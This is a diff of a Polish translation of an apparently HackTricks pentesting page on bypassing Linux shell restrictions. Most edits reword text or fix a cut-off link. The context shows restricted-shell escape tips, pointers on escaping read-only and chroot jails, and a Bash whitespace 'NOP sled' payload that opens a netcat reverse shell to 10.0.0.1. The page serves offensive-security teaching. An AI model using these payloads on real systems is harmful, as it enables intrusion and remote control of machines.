@@ -1,4 +1,4 @@
-# Ominięcie Ograniczeń Linuxa
+# Ominięcie Ograniczeń w Linuksie
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -144,7 +144,7 @@ Możesz użyć **burpcollab** lub [**pingb**](http://pingb.in) na przykład.
 
 ### Builtins
 
-W przypadku, gdy nie możesz wykonywać zewnętrznych funkcji i masz dostęp tylko do **ograniczonego zestawu builtins, aby uzyskać RCE**, istnieje kilka przydatnych sztuczek, aby to zrobić. Zwykle **nie będziesz mógł użyć wszystkich** **builtins**, więc powinieneś **znać wszystkie swoje opcje**, aby spróbować obejść więzienie. Pomysł od [**devploit**](https://twitter.com/devploit).\
+W przypadku, gdy nie możesz wykonywać zewnętrznych funkcji i masz dostęp tylko do **ograniczonego zestawu builtins, aby uzyskać RCE**, istnieje kilka przydatnych sztuczek, aby to zrobić. Zazwyczaj **nie będziesz mógł użyć wszystkich** **builtins**, więc powinieneś **znać wszystkie swoje opcje**, aby spróbować obejść więzienie. Pomysł od [**devploit**](https://twitter.com/devploit).\
 Przede wszystkim sprawdź wszystkie [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Oto kilka **zalecenia**:
 ```bash
 # Get list of builtins
@@ -296,13 +296,15 @@ ln /f*
 ```
 ## Bypass tylko do odczytu/brak wykonania/bez dystrybucji
 
-Jeśli znajdujesz się w systemie plików z **ochronami tylko do odczytu i brakiem wykonania** lub nawet w kontenerze bez dystrybucji, nadal istnieją sposoby na **wykonanie dowolnych binarnych, nawet powłoki!:**
+Jeśli znajdujesz się w systemie plików z **ochronami tylko do odczytu i brakiem wykonania** lub nawet w kontenerze bez dystrybucji, wciąż istnieją sposoby na **wykonanie dowolnych binarnych plików, nawet powłoki!:**
+
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
 ## Bypass Chroot i innych więzień
+
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
@@ -312,7 +314,7 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 Gdy luka pozwala ci częściowo kontrolować argument, który ostatecznie trafia do `system()` lub innej powłoki, możesz nie znać dokładnego przesunięcia, w którym wykonanie zaczyna odczytywać twój ładunek. Tradycyjne NOP sledy (np. `\x90`) **nie** działają w składni powłoki, ale Bash zignoruje wiodące białe znaki przed wykonaniem polecenia.
 
-Dlatego możesz stworzyć *NOP sled dla Basha*, poprzedzając swoje prawdziwe polecenie długą sekwencją spacji lub znaków tabulacji:
+Dlatego możesz stworzyć *NOP sled dla Basha* poprzez dodanie długiej sekwencji spacji lub znaków tabulacji przed swoim rzeczywistym poleceniem:
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
@@ -333,7 +335,7 @@ Praktyczne przypadki użycia:
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
